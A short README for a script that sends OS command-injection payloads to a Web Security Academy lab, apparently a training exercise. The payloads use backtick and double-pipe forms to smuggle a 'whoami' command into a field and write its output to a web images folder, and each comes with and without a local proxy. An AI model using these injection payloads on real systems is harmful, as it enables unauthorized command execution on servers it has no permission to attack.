# How to run script.py

### 1. \`whoami > /var/www/images/whoami.txt\`

No proxy:
- python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test\\\`whoami > /var/www/images/whoami.txt\\\`"

Proxy:
- python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test\\\`whoami > /var/www/images/whoami.txt\\\`" -p 127.0.0.1:8080

### 2. ||whoami > /var/www/images/whoami.txt||

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test||whoami > /var/www/images/whoami.txt||"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test||whoami > /var/www/images/whoami.txt||" -p 127.0.0.1:8080`
